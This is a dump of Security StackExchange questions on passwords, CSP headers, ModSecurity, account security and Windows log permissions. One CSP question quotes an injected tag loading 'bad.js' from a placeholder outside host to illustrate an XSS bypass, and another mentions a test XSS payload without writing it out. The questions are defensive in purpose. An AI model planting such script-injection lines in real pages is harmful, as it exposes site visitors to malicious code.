<p>When user wants to log in on the browser, the server sends 5 random one digit values like:</p>

<pre><code> 1,2,3,4,5
</code></pre>

<p>corresponding to <code>A,B,C,D,E</code> respectively.</p>

<p>and now user has to enter his password like :</p>

<p><code>apple3520green</code></p>

<p>This protects the password from being exposed , as it can't be compromised because it will change every time.</p>

<p>I have created a demo version of this implementation on <a href=""http://advpassword.com"" rel=""nofollow"">http://advpassword.com</a>
And I love to have your comments about it on the website ( Good or Bad )</p>
","119065","","119065","","2016-08-02 22:17:52","2021-01-09 12:34:12","Can use this security system on websites?","<passwords><password-cracking><account-security>","5","1","","","","CC BY-SA 3.0"
"269193","1","","","2023-03-18 08:16:26","","0","119","<p>I lack knowledge about IP addresses or how the internet works. Let's assume that after I wrote a message to someone on social media, they just felt the need to track me down within a week, is it possible to track location, home address via a message I wrote on social media?</p>
<p>Should I be concerned about it?</p>
","290708","","6253","","2023-03-18 11:42:20","2023-08-15 12:01:40","Tracking someones location from social media messages","<account-security><ip>","1","0","","","","CC BY-SA 4.0"
"197512","1","","","2018-11-12 13:09:49","","3","912","<p>I have an application that currently keeps a few properties from a user's profile in session storage for the app to use when necessary. We don't keep sensitive data like username or password or ssn in session storage, but we do keep properties like the user's branch there. And the app uses the branch info to load certain data, while excluding other data. For instance, if a user's branch is ""New York"" then we load data relevant to that branch. </p>

<p>To clarify further, this is an in-house app -- behind a VPN -- so only employees will be using the app. And we let them temporarily change their branch in the app itself if, for instance, they're in the New York branch but want to see data from Los Angeles. </p>

<p>Is using session storage like this considered a reasonable practice, or should something like this always be stored in something like JavaScript storage? I have one colleague who seems to think this should definitely not be in session storage, but I'm not sure that's the case here. Is this considered a major no-no in this kind of use case? Or could this be considered a reasonable usage of session storage?</p>
","191128","","191128","","2018-11-12 14:10:36","2023-07-20 19:05:35","Using SessionStorage for Some User Info","<javascript><account-security><user-management>","2","2","","","","CC BY-SA 4.0"
"131802","1","131806","","2016-08-03 11:49:07","","3","195","<p>Personally I do most of the development in PHP (the programming language doesn't really matter for this question). Popular PHP frameworks along developers are for example:</p>

<ol>
<li><a href=""https://www.codeigniter.com/"" rel=""nofollow"">CodeIgniter</a></li>
<li><a href=""https://laravel.com/"" rel=""nofollow"">Laravel</a></li>
<li><a href=""https://symfony.com/"" rel=""nofollow"">Symfony</a></li>
</ol>

<p>From this three frameworks, I know most about CodeIgniter and in general I think they supply developers with a good <a href=""http://www.codeigniter.com/user_guide/libraries/input.html"" rel=""nofollow"">input library</a> and pay extra attention to <a href=""http://www.codeigniter.com/user_guide/general/security.html"" rel=""nofollow"">security</a>. Also they have a <a href=""https://hackerone.com/codeigniter"" rel=""nofollow"">security program</a> in order for researchers to report vulnerabilities in the framework in order to fix those. <em>Disclaimer: I'm also contributing to the CodeIgniter framework and their security program.</em></p>

<p>My general question is: is it better to rely on an existing framework for developing an application in order to extend a basic security-by-design structure. Or is it safer to start from scratch and develop everything yourself?</p>

<p>In other words: With security-by-design in mind, is it safer to start developing an application based on an existing application framework or to start from scratch with a custom build design?</p>

<p><em>Let alone that developers of course need to use the framework functions properly in order to benefit of them. The same applies on custom build functions/features.</em></p>
","72031","","98538","","2016-08-10 08:06:23","2016-08-10 08:06:23","Security-by-design based on an existing framework or a custom design?","<web-application><design-flaw><security-by-design>","1","1","0","","","CC BY-SA 3.0"
"269240","1","","","2023-03-20 20:33:47","","1","96","<p>For the purpose of my studies, I am trying to answer the below scenario, in my opinion it is not a good idea, because it would leave the system open to brute-force attacks.</p>
<blockquote>
<p>A novel password scheme is suggested, where it requires long passwords
(10-12 symbols) that include at least one non-alphabetic symbol found
on a standard computer keyboard. When the user enters their password,
the system will accept or reject passwords one character at a time. It
is claimed that this would make it easier for users to remember very
complex passwords, while maintaining the security of the
authentication mechanism.</p>
<p>Explain why this approach is not a good idea.</p>
</blockquote>
<p>Can anyone provide their input?</p>
","290804","","6253","","2023-03-20 21:27:09","2023-03-20 21:27:09","Why is it a bad idea to accept passwords one character at a time for an authentication mechanism?","<authentication><passwords><account-security>","1","3","","","","CC BY-SA 4.0"
"131831","1","131834","","2016-08-03 15:46:19","","0","6859","<p>I just read this article about making a computer safer: <a href=""http://www.komando.com/tips/12210/one-change-that-instantly-maakes-your-computer-safer"" rel=""nofollow"">Komando</a>.</p>

<p>They recommend using a <strong>standard</strong> user account for daily use, and using a separate <strong>admin</strong> account for making changes. I do this at work so that if someone sees my password, they won't be able to make serious changes to my system.</p>

<p>On my Windows 10 laptop at home, I use the admin account for daily use. I never install anything, except the Chrome browser. I literally never install anything because I am paranoid. I don't even have flash and I disabled the browser extensions/plugins. In this situation, how would using a separate standard account make it safer?</p>

<p>To put it another way, if you were attacking a system like my home laptop, would it slow you down at all if they were using a standard account?</p>
","119399","","","","","2016-08-03 16:26:43","Using a standard account is safer?","<windows-10><account-security>","2","2","","2016-08-04 11:44:29","","CC BY-SA 3.0"
"197646","1","197874","","2018-11-14 08:33:39","","2","246","<p>I am in the process of De-Googling myself and setting complex passwords.</p>
<ul>
<li>I changed my registered Gmail to an alternative mail provider</li>
<li>I changed my password to a complex one</li>
</ul>
<p>I use mostly <a href=""https://alternativeto.net/software/vbulletin/"" rel=""nofollow noreferrer"">vBulletin and similar</a> forums.</p>
<p>It's very well known that Facebook, Apple, Microsoft, Google and Amazon never delete any old records.</p>
<p>But does this also apply to off-the-shelf forum CMS systems? Can the admin see my previous email address and password hash?</p>
<p>Please describe how this is handled for the most popular discussion forum CMS (vBulletin, Discourse, phpBB  and Simple Machines Forum). It's a privacy issue, so I don't want the admin to store my previous email and password hash.</p>
<p>It's very clear that the old records are in backup (<code>mysqldump</code>), so I’m asking more about the live DB.</p>
","16066","","256139","","2021-04-25 21:29:21","2021-04-25 21:29:21","Do vBulletin and similar discussion forum CMS store previous email address and password hash in database?","<privacy><account-security><cms>","2","1","","","","CC BY-SA 4.0"
"269411","1","","","2023-03-28 23:04:35","","0","30","<p>I have an ongoing electronic and physical stalking situation. Someone has hacked my computer and is able to at times see my activities such as sending email and shopping. They also took screenshots off the screen of my computer while I had the Dashboard to my security system open. I have a lot of ssh.exe and related files over and over, many of them recurring on the same day. I do not know if this could be related to the hacking. I have Remote Desktop disabled. I have blocked every kind of sharing I can figure out in the firewall. I have deleted connected devices repeatedly from the services (although they reappear after I turn my computer off and then on again).</p>
<p>My internet provider said it could be hacked via my router. (This is Sprint. It is their router but they have done nothing to remedy the situation) I have a separate internet account that I pay for but I live in an apartment building with Sprint WiFi that is provided with each apartment.</p>
<p>Any advice or suggestions?</p>
","291139","","47524","","2023-03-29 00:56:45","2023-03-29 00:56:45","Have an electronic and physical stalker with access to my computer when I am online","<account-security>","0","4","","2023-03-29 09:27:47","","CC BY-SA 4.0"
"197720","1","","","2018-11-15 10:50:56","","64","15598","<p>At my job, to be able to view my paychecks, vacation hours and HR data on myself I need to log into a 3rd party website.</p>

<p>I'm by no means a security expert or expert programmer but I could tell (simply by trying) that I could continue to try incorrect passwords without being locked out. (brute force: viable)</p>

<p>After logging in I was forced to select 3 pre-determined security questions in the case of a password reset (out of a total of 8!) such as my first car's licence plate (never owned a car 3/7), my spouse's 2nd name (don't have a spouse 3/6), 2nd name of my first kid (don't have kids 3/5),  birthdate, name of my highschool, favorite pet, favorite film or favorite piece of music.</p>

<p>Most these things you can simply get from my facebook, (which, I should note, has not been updated for years!) again showing a distinct lack of understanding in basic security practices.</p>

<p>I also get the feeling, from looking at the site through the developer tools they use incredibly outdated software </p>

<pre><code>A JavaScript implementation of the RSA Data Security, Inc. MD5 Message
* Digest Algorithm, as defined in RFC 1321.
* Version 2.1 Copyright (C) Paul Johnston 1999 - 2002.
</code></pre>

<p>I reported this through my company but my superiors don't appear all that interested.</p>

<p>How would I go about: </p>

<p>A. Finding out if this site is really as insecure as I think it is?</p>

<p>B. if true: communicating this in an appropriate manner to the company itself
(preferably in an anonymous fashion)</p>
","191356","","27444","","2018-11-18 10:41:17","2019-01-29 22:33:57","Employer makes me use what I believe to be an insecure website for HR functions. What to do?","<account-security><websites>","6","14","","","","CC BY-SA 4.0"
"133060","1","133063","","2016-08-05 14:20:05","","3","194","<p>I am doing some analogous research on data collection and was curious if a company followed up with you asking for your SSN what would be the safest / most convenient way to send it to them. </p>

<p>Some thoughts I had were</p>

<ul>
<li>Email with secure link to a form on the company's webpage</li>
<li>Direct number for someone who will pick up immediately, no automated system or waiting</li>
<li>A form to select the best time to call you back</li>
<li>Somewhere on the companies phone app</li>
</ul>

<p>For the sake of argument lets just say it is required by the government to submit it.</p>
","120625","","98538","","2016-08-08 08:08:24","2016-08-08 08:08:24","What conditions would make you feel comfortable inputting your SSN?","<email><account-security>","1","1","","","","CC BY-SA 3.0"
"269473","1","","","2023-04-01 17:01:58","","0","57","<p>If some security measure serves only to add an extremely <em>small</em> barrier to an attack, are there generally accepted principles for deciding whether that measure should be retained?</p>
<p>Does <strong>defence in depth</strong> advocate that <em>any</em> hurdle (no matter how small) should be left in the path of potential adversaries, or does it only require redundant substantive hurdles (that might have been expected to suffice individually)? Conversely, does <strong>security theatre</strong> advocate for removing the low hurdles (to avoid overestimation of the actual security), or does it only require that some substantive hurdles must also exist (tolerating for low hurdles to be placed too)? In other words, concerning weak additional security measures, is there a general consensus or diverging views?</p>
<p>An example might be something like limiting general developers and wider staff from having visibility of security discussions and analysis. This avoids leaking security analysis in convenient form to an attacker if a staff account becomes compromised, but it also reduces opportunities for alignment and collaboration on security and security culture. Alternatively, a small potential security benefit may come at the cost of complexity (potentially raising maintenance expense or risking misconfigurations and security holes), for example a policy of censoring AWS EC2 instance ids in support requests adds friction/inconvenience but the supposed benefit is unlikely to be critical.</p>
","267765","","267765","","2023-04-02 02:03:43","2023-04-02 02:03:43","Security in depth vs security theatre","<defense><security-theater>","2","0","","","","CC BY-SA 4.0"
"133124","1","133126","","2016-08-06 19:44:28","","5","1057","<p>Is ""sign in with Facebook"", ""sign in with Google"", etc. bad for security? A hacker only needs to compromise your Facebook/Google/Yahoo/etc. account, and they'll have access to all of your other accounts that are connected to your Google or Facebook account.</p>
","78664","","78664","","2017-03-21 01:01:33","2017-03-21 01:01:33","Is ""sign in with Facebook"", ""sign in with Google"", etc. bad for security?","<account-security><single-sign-on>","2","0","","2017-09-15 10:37:50","","CC BY-SA 3.0"
"197989","1","","","2018-11-19 14:48:27","","1","190","<p>I am making a webpage (similar to a social media) which will be open-source, but will probably only run off one server, with multiple levels (php, javascript(hopefully without any modules), postgresql). </p>

<p>Now I have read somewhere, that it is a good idea to have your database designed in such a way, hat even if someone gets hold of it, they can't get at sensitive info (password, etc.).</p>

<p>However, as far as I know, the GDPR classifies email addresses as sensitive/personal info, so that should be protected as well. Since I will be sending confirmation and notification emails, a hash will not be good, and I have no idea where I should encrypt the email addresses: If at a php level, I will either have a hard-coded key (BAD) or a configuration file with a key in it (more problems). I have been told that I can do it at a database level but if I'm protecting them against the database being stolen, wouldn't that also steal the encryption key? </p>

<p>What is the proper way to keep emails hidden even if the database is compromised?</p>
","191675","","","","","2018-11-19 15:00:41","hiding emails in database","<web-application><databases><account-security>","1","0","","2018-11-19 15:07:10","","CC BY-SA 4.0"
"197990","1","198014","","2018-11-19 14:54:21","","2","590","<p>I created a simple test web application to test the use of the content security policy header. I included a vulnerability in my test app, such that submitting a basic XSS payload with script tags would be reflected back in full and execute a javascript alert...simple stuff.  I included a basic CSP header:</p>

<pre><code>Content-Security-Policy: default-src 'self'
</code></pre>

<p>I assumed this would stop the XSS, due to ""CSP solves this problem by banning inline script entirely"" <a href=""https://developers.google.com/web/fundamentals/security/csp/"" rel=""nofollow noreferrer"">https://developers.google.com/web/fundamentals/security/csp/</a></p>

<p>But, the js alert is still popping. I was able to verify that the header is being returned in the server response as expected. I tested with several up-to-date browsers (chrome, firefox, ie11). I applied the header in iis as follows:</p>

<pre><code># IIS Web.config
&lt;system.webServer&gt;
    &lt;httpProtocol&gt;
        &lt;customHeaders&gt;
            &lt;add name=""Content-Security-Policy"" value=""default-src 'self';"" /&gt;
        &lt;/customHeaders&gt;
    &lt;/httpProtocol&gt;
&lt;/system.webServer&gt;
</code></pre>

<p>Is my implementation incorrect, or are my expectations wrong here?</p>
","161809","","","","","2018-11-26 03:31:05","Content Security Policy Header not stopping attack","<xss><content-security-policy><header>","2","5","0","","","CC BY-SA 4.0"
"133191","1","","","2016-08-07 23:57:20","","2","132","<p>When getting a new appliance, be it a firewall or or the like, how much safer is it really to replace the default admin account/username with a differently-named account but with same privilege level?</p>

<p>In my mind, the only scenario in which this is of any benefit is making the replacement account a complex username?</p>

<p>Otherwise, replacing ""Admin"" with ""ourcompany_admin"" or the like simply buys you only a small amount of extra time if brute-forced?</p>
","29401","","","","","2016-08-08 15:15:08","How much safer is it really to replace the default account with a new account?","<authentication><account-security>","2","1","","","","CC BY-SA 3.0"
"198052","1","","","2018-11-20 11:16:05","","3","1379","<p>I am reviewing the Content-Security-Policy headers set in one of our webservers and I see this is how it is set (where 'example.com' is our trusted website). </p>

<blockquote>
  <p>Content-Security-Policy: ""default-src 'self'; script-src 'self' data:
  'unsafe-inline' 'unsafe-eval'; img-src 'self' *.example.com; font-src
  *; connect-src 'self' *example.com""</p>
</blockquote>

<p>My questions are:</p>

<p>1) Won't whitelisting <code>unsafe-inline</code> and <code>unsafe-eval</code> kind of defeat the whole CSP? </p>

<p>2) If 'unsafe-inline' is allowed or whitelisted as above, can someone call a JavaScript from an external website, say www.xxxxxx.com that is not whitelisted in <code>script-src</code> directive and there-by defeat the whole purpose of CSP? Eg: <code>&lt;script src=""www.xxxxxx.com/bad.js""&gt;</code></p>

<p>I went through <a href=""https://security.stackexchange.com/questions/152547/why-are-inline-scripts-and-styles-considered-not-secure-under-content-security-p"">this question here</a> and going by the answers, it does look like the above CSP is <em>not</em> good.</p>
","58761","","","","","2018-11-26 15:34:45","Does allowing unsafe-inline script defeat the purpose of CSP?","<content-security-policy>","2","0","","","","CC BY-SA 4.0"
"269662","1","269664","","2023-04-12 01:49:43","","2","157","<p>Companies universally seem to invest massive amounts of time and development resources into protecting users from security-related crimes. The trend seems to be increasing steadily over the past 15 years.</p>
<p>What is the <em>business</em> reason that a company would want to protect the online security of users? What is the business benefit of protecting me, especially when the protections are so aggressive as to make me want to do business with somebody else? What would the consequence be to, say, Google, if a user's account was hacked into? What does Facebook stand to lose if an unauthorized person accesses my account? What does Amazon lose if somebody steals my package?</p>
<p>Note: I'm talking specifically about user protections, not about the internal cybersecurity practices of the company itself to protect its own resources. For example, I'm referring to e.g. mandatory 2FA, not to, say, a company keeping its servers secure (which would obviously cause business to be lost -- if users couldn't trust the company they wouldn't use it).</p>
","29269","","6253","","2023-04-12 15:17:04","2023-04-12 15:19:09","Why is individual user security important to a company?","<account-security><multi-factor>","2","5","","","","CC BY-SA 4.0"
"269686","1","269691","","2023-04-13 02:40:39","","0","121","<p><a href=""https://github.com/coreruleset/coreruleset"" rel=""nofollow noreferrer"">OWASP Core Rule Set</a> has many versions the latest is version 4.0 (release candidate), but I cannot find any indication about compatibility among various modsecurity releases.</p>
<p>Could these be used with any modsecurity version, or is there some specific version requirement?</p>
","225381","","","","","2023-04-13 07:06:24","Compatibility of ModSecurity Core Rule Set 4","<owasp><mod-security>","1","0","","","","CC BY-SA 4.0"
"269714","1","","","2023-04-14 18:16:22","","1","62","<p>I've read about Linus Tech Tips hack, where a malware stole the browser cookies &amp; was able to log in to Linus's channel.</p>
<p>Is this preventable with Windows controlled folder access (preventing apps other than Chrome from accessing the cookie files)?</p>
","291808","","275693","","2023-04-14 21:30:43","2023-09-12 14:04:10","Windows controlled folder access to secure Chrome cookies?","<vulnerability><account-security><multi-factor><u2f><fido>","2","1","","","","CC BY-SA 4.0"
"133334","1","","","2016-08-09 07:04:23","","0","348","<p>I have recently opened an account at a brokerage firm, based in India, which unfortunately it seems to me is not following good measure to ensure security. But I maybe wrong since I am not an expert in this field. Hence I am asking for help.</p>

<p>The firm on their webpage login, restricts the password length to max 12 characters and asks me to answer 5 stupid questions such as ""What is your mother's maiden name?"" as a 2FA measure. For some reason in one of their FAQ webpage they also suggest that the user can answer the 5 questions with ""a"" since that will be easier to remember. As a added measure of security if I enter wrong password more than 3 times, my account will be locked and I'll have to reset my account using the 5 security questions. In their privacy policy they mention only one fact about account security, that they use SSL encryption. They never mention if they have had any security audit done by Verisign, Norton, or other third party.</p>

<p>Are they being lax in their online security? If so how much and what are the minimum measures an institution like them should take to ensure online safety of their customers account?</p>
","120932","","120932","","2016-08-09 08:28:36","2017-06-05 19:10:57","Is my online account at a financial firm safe?","<account-security>","1","6","","","","CC BY-SA 3.0"
"269804","1","269813","","2023-04-20 20:50:28","","2","1250","<p>I'm currently experiencing an issue where base64 encoded fonts are being blocked by CSP on my website (note that I replaced the base64 with <code>abcdefg</code> in this example:</p>
<pre><code>Refused to load the font 'data:font/woff2;base64,abcdefg///abcdefg' because it violates the following Content Security Policy directive: &quot;font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://maxcdn.bootstrapcdn.com&quot;.
</code></pre>
<p>The fix for this is to add <code>data:</code> to the fonts-src directive in the content security policy, for example:</p>
<pre><code>&quot;font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com https://maxcdn.bootstrapcdn.com&quot;
</code></pre>
<p>However, this opens my website up to data from <strong>all sources</strong>, not just the sites I have specified. I know that use of <code>data:</code> for default-src is deemed insecure in relation to XSS attacks, <a href=""https://security.stackexchange.com/questions/94993/is-including-the-data-scheme-in-your-content-security-policy-safe"">see this previous question</a></p>
<p>However what is not clear to me is if it is insecure for specifically font-src. What is the worst that could happen if I used this? Will a script kiddie convert my site into wingdings? I have found no evidence anywhere that it would have harmful effects, but at the same time it seems it is recommended everywhere with reckless abandon.</p>
<p>Can someone give me the definitive answer on this? And if it is indeed insecure, why is <code>data:</code> even a feature of CSP if it opens everyone up to accidental security incidents?</p>
","292058","","","","","2023-04-21 11:22:59","Is it safe to use font-src with data: in a Content Security Policy?","<xss><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"269854","1","269855","","2023-04-24 01:44:32","","-1","77","<p>What if someone signs up on a game by using your email address without your permission? What if someone signs up using your email address illegally?</p>
<p>I'm not talking about signing in and stealing credentials. Someone just signs up for a new account.</p>
<p>What they can do next? Is this something to be afraid of?</p>
","291974","","6253","","2023-04-24 07:47:03","2023-04-24 07:48:58","Signup on a Game by using other's email addresses","<account-security>","1","3","","2023-04-24 07:49:01","","CC BY-SA 4.0"
"133453","1","133454","","2016-08-10 07:04:51","","12","17528","<p>I am in a bit of confusion as we have been asked to AES encrypt passwords before sending it to the server. The whole website communicates over HTTPS with the server and uses secure cookies. </p>

<p>AFAIK, HTTPS uses an SSL 128 bit encryption (could be 256 bit, not sure) and this happens at the Transportation Layer. I am assuming as long as the client is not compromised, an attack at Presentation or Application layer is not possible. Thus, once SSL encrypted, I think information will reach the server safely. </p>

<p>So is it still required to encrypt valuable information such as passwords at the client side before sending it to the server?</p>
","121056","","5405","","2016-08-10 07:30:32","2016-08-10 08:10:57","Is encryption of passwords needed for an HTTPS website?","<tls><authentication><aes><account-security>","4","4","","2016-08-10 13:35:23","","CC BY-SA 3.0"
"270070","1","","","2023-05-05 06:36:28","","0","75","<p>Here is my configurations:</p>
<pre><code>SecDefaultAction &quot;phase:1,log,deny,status:403&quot;
SecDefaultAction &quot;phase:2,log,deny,status:403&quot;

SecRule REQUEST_URI &quot;@pm logging_test&quot; \
    &quot;id:100,\
    phase:1,\
    pass,nolog,\
    capture,\
    msg:'Test Error Logging'&quot;
</code></pre>
<p>but I still get the entries in the error.log</p>
<p>In Manual, nolog means</p>
<blockquote>
<p>Prevents rule matches from appearing in both the error and audit logs.</p>
</blockquote>
<p>How to disable error.log for a specific rule?</p>
","292577","","","","","2023-05-05 06:36:28","ModSecurity: How to disable error logging for single rule?","<mod-security>","0","3","","","","CC BY-SA 4.0"
"198498","1","","","2018-11-27 09:47:32","","1","1858","<p>The only related rule in mod-security for slow DoS is <code>modsecurity_crs_11_slow_dos_protection</code>, and it's for Apache only.
Is there a rule for Nginx?</p>
","192247","","10863","","2018-11-28 08:08:08","2018-11-28 08:08:08","Nginx: mod-security rule for http slow DoS attack","<ddos><denial-of-service><nginx><mod-security>","1","0","","","","CC BY-SA 4.0"
"198538","1","201148","","2018-11-27 19:36:19","","2","230","<p>In a system with a complex set of computed authorizations, does conveniently allowing a given user access to view all of their own authorizations decrease security? </p>

<p>In a ""Policy as Code"" system which relies on consumers of its API to develop their own integrations, it seems like a wise idea to allow convenient viewing of ALL of user authorizations, because a given user can request access more easily and take advantage of ""code as documentation"", rather than pestering InfoSec for the state of their authorizations on an as-needed basis. </p>

<p>To block access to a comprehensive list of a user's own computed authorizations seems to me like a matter of ""security through obscurity"", since users can likely explore the system to find out what they can and cannot access. </p>

<p>This came up in a discussion I had with a coworker on the subject of this Vault mailing list post about Vault Policy viewing: </p>

<p><a href=""https://groups.google.com/forum/#!topic/vault-tool/eZZQMDWIdsk"" rel=""nofollow noreferrer"">Inspect your own token's policies?</a></p>

<p>But it applies to a lot of other things. Anyway, I'm asking this question because I've been wrong before, I think it's premature for me to declare that ""it's just obscurity"":</p>

<p><strong>How do I tell whether allowing a user to easily view ALL of his own authorizations will increase vulnerability?</strong> </p>
","78278","","78278","","2019-01-09 22:44:12","2019-01-12 16:28:34","Does allowing a user to know their own authorized capabilities decrease security?","<access-control><authorization><security-theater><obscurity><hashicorp-vault>","4","1","","","","CC BY-SA 4.0"
"198547","1","","","2018-11-27 20:44:41","","4","319","<p>I know about <code>inotify</code> but am concerned it would use too many resources.</p>

<p>Is there a better way to monitor a fairly static system (like a web host) for new and unexpected files being created?</p>
","52859","","","","","2018-11-27 21:26:15","is there a low-overhead way to log every new file created on a Linux host?","<linux><logging><content-security-policy>","1","1","","","","CC BY-SA 4.0"
"270188","1","","","2023-05-11 16:41:56","","0","46","<p>In a web application where you have to log in, we want to implement a feature that shows recently used accounts for the device.</p>
<p>The login screen will display a list of the usernames of the accounts that have recently logged in via the current device. It is about the same as the Google or Facebook login.</p>
<p>The difference is that we always ask for a password. The feature is therefore not intended to simply click on the account and you are logged in. We always want the user to type in a password. The usefulness of the feature is that you do not have to keep typing in your username / email address, but can click on a recent account and enter your password.
To identify the device, a cookie is required in all cases as far as we can imagine.</p>
<p>Now the question is:
How will we store the details of recently used accounts?
Two options we can think of:</p>
<ol>
<li>Store a unique identifier &quot;token&quot; in a cookie. Store on the server which recent accounts are associated with that cookie (i.e. device) and then display these usernames on the login page to click on.</li>
<li>Store the recent accounts in the cookie, so on the device itself.</li>
</ol>
<p>With option 1 we think of the following threats:</p>
<ul>
<li>If the cookie containing the token is stolen, the cookie can be impersonated on any device, thus spying on another device/location to see what recent accounts are being used on the actual device the cookie was intended for.</li>
</ul>
<p>Option 2 seems to have the greatest risk of problems, because:</p>
<ul>
<li>With many recent accounts, the data in the cookie could become too large (when for example also some metadata and/or &quot;last login date&quot; is contained).</li>
<li>If a username changes, the old username is still in the cookie. Unless the cookie is updated when changing the username in the account settings.</li>
<li>With option 1, the token in the cookie can be invalidated on the server, after which the cookie can no longer be used. This is not possible with option 2.</li>
</ul>
<p>In all cases we do not want to be &quot;smart&quot; by using information such as IP address or screen resolution etc., because this information changes regularly, on mobile internet devices anyway and also with people who use a VPN.</p>
<p>How should this feature be implemented?</p>
","167223","","","","","2023-06-10 19:00:20","Best way to store remembered recently used accounts for web application","<authentication><account-security>","1","0","","","","CC BY-SA 4.0"
"133752","1","","","2016-08-12 15:04:11","","1","121","<p>So we have some Windows 7 systems with some security requirements. I am trying to disable read access the security log.  The command “wevtutil gl security” shows a result of the following:</p>

<blockquote>
  <p>channelAccess: O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x7;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x1;;;S-1-5-32-573)</p>
</blockquote>

<p>From what little I know of these things, I am thinking that the “(A;;0x3;;;IU)” is giving interactive users read and write of the log (they cannot clear it)</p>

<p>What puzzles me is that the command </p>

<blockquote>
  <p>wevtutil sl security /ca:O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x7;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x1;;;S-1-5-32-573)</p>
</blockquote>

<p>shows immediate results on our normal windows 7 PC’s, but it does NOTHING on the machines in question.  The command runs, gives no error, but “wevtutil gl security” still shows the “(A;;0x3;;;IU)” in the channelAccess string.  </p>

<p><strong>What am I doing wrong?</strong></p>
","121287","","","","","2016-08-12 15:04:11","Cannot disable read access the Windows 7 security log","<windows><account-security><windows-server><group-policy>","0","1","","","","CC BY-SA 3.0"
"58038","1","","","2014-05-15 09:21:21","","11","621","<p>I'm seeing a lot of Content Security Policy (CSP) reports raised because of client-side malware. Many have ""<code>blocked-uri</code>"" entries like <code>randomstring.cloudfront.net</code>, <code>something.akamaihd.net</code> and so on.</p>

<p>I would like to detect CSP reports caused by malware, so I can ignore them. Ignoring <code>*.cloudfront.net</code> doesn't seem right, is there a way?</p>
","46655","","72313","","2016-09-09 18:42:36","2016-09-09 18:42:36","CSP Reports: Ignoring Client Malware","<malware><content-security-policy>","3","17","","","","CC BY-SA 3.0"
"270229","1","","","2023-05-13 13:54:13","","0","19","<p>I am using fortinet client vpn to access employer's computer.
I'm worried if my employer can collect my browsing history ?
What about the browsing history of few minutes before connecting the vpn ?</p>
","292647","","","","","2023-05-13 13:54:13","Information shared by fortinet client vpn","<privacy><account-security>","0","0","","","","CC BY-SA 4.0"
"270243","1","","","2023-05-14 11:30:55","","0","220","<p>My friend logged into my Facebook account from his Android phone using the Facebook app, but when I try looking for the devices on the security page I only can see mine. It's like his device is hidden but still logs on and has access to my account. I want to know how to do that and figure it out.</p>
","292934","","6253","","2023-05-14 16:24:01","2023-05-14 16:24:01","How can a device hide that is currently logged on Facebook","<account-security><facebook>","0","0","","","","CC BY-SA 4.0"
"270285","1","","","2023-05-17 03:49:09","","0","199","<p>There is a new internet service provider in town that provides fiber internet--their internet is fast and it's proven. Almost everyone in our town switched to their internet. However, I am kind of skeptical to subscribe for some reasons:</p>
<ol>
<li>They don't have a website, just a facebook page with 500 likes :&lt; Their business name is also suspicious as they're only called &quot;Fiber Speed&quot; which is a very common name and doesn't even sound as a business name.</li>
<li>They only operate in small towns, not even more than 10 towns.</li>
<li>They said they get their internet from a popular network in our country and I can confirm that since I saw it in the speedtest but they offer their fiber internet for a cheaper price, I'm not even sure if they operate legally lol.</li>
<li>I don't think they have an office. They also have these flyers that are obviously not professionally designed.</li>
</ol>
<p>I am just worried about my internet security because I do a lot of online bank transactions as I work as a freelancer online. I always use VPN when connected to their network because I don't feel safe.</p>
<p>How can I make sure their internet is safe and they're not trying to spy on the information we share online?</p>
","293040","","","","","2023-05-17 10:50:09","How can I be sure that my internet service provider is safe?","<wifi><account-security><internet>","3","3","","","","CC BY-SA 4.0"
"198739","1","215967","","2018-11-29 18:48:06","","0","189","<p>Error and exception handling in web applications can introduce security issues, often in the form of denial of service (i.e., when a service crashes because of poor error handling) and information disclosure (i.e., when an exception containing sensitive details about the system is propagated to the user/attacker).</p>

<p>To combat this, the system needs to fail gracefully, revealing little details about the failure and recovering as much as possible. When it comes to exceptions, managed languages have simple and well-understood mechanisms for exception handling. However, throughout my research I have failed to find advice on how to construct a proper exception handling mechanism in modern web applications that include several layers of logic between the database and the client applications.</p>

<p>For example, the Spring framework has the controller (that provides the APIs and handles HTTP requests), the service (that contains the majority of the business logic) and the repositories (that handle communication between the application and the database). Additionally, the service can interface with utility components and modules that offer various functionality (i.e., file access, algorithm calculation). The following data flow diagram illustrates this architecture.</p>

<p><a href=""https://i.stack.imgur.com/ZdiCj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ZdiCj.png"" alt=""Simple data flow diagram of modern web applications""></a></p>

<p>By examining the origin of exceptions, we can see that the Calculation Engine, Repository, and File Access Utility can (potentially) reveal some details about the system, should an exception be thrown when interfacing with the different datastores (i.e., information about the SQL database, knowledge base schema, etc.).</p>

<p>The questions then becomes, where should developers handle these exceptions, and reduce the risk to both information disclosure and denial of service?</p>

<p>An approach that seems suitable for me is to handle exceptions as they arise and wrap them into application-specific exceptions. The parts of the application that have data flows that cross a trust boundary (e.g., to the file system, the Internet) should sanitize all exceptions by wrapping them into ""more friendly"" custom exceptions (created by the developers) to stop any risk from information disclosure being propagated further, as well as to localize any component failure.
The internal components should then know how to handle application exceptions more suitably.</p>

<p>The main drawback of this approach is that the exception handling mechanism is more complex, as it requires the introduction of application-specific exceptions for each category of native (and applicable) exceptions.</p>

<p>Does this approach have any other pros and cons, and is there an alternative design that handles the balance between security and workload better?</p>
","94282","","","","","2019-08-28 13:42:03","Exception handling in multi-tier applications","<design-flaw><error-handling><security-by-design>","2","0","","2019-09-22 18:08:18","","CC BY-SA 4.0"
"270345","1","","","2023-05-21 15:47:27","","0","15","<p>I just opened the Google Authenticator app and it says: &quot;Sign in to back up your codes to your Google Account&quot;.</p>
<p>How is that secure?</p>
<p>I mean, wouldn't doing that essentially defeat the purpose of two-factor authentication (2FA), since it'd let anyone who figures out the password to your Google Account log in to any account for which you've stored the password in Google Password Manager and the 2FA code in Google Authenticator?</p>
<p>Google's announcement <a href=""https://security.googleblog.com/2023/04/google-authenticator-now-supports.html"" rel=""nofollow noreferrer"">Google Authenticator now supports Google Account synchronization</a> doesn't seem to answer my question.</p>
<h4>Related</h4>
<ul>
<li><a href=""https://security.stackexchange.com/q/254841/13888"">Is 2FA based on Google Authenticator Real?</a></li>
</ul>
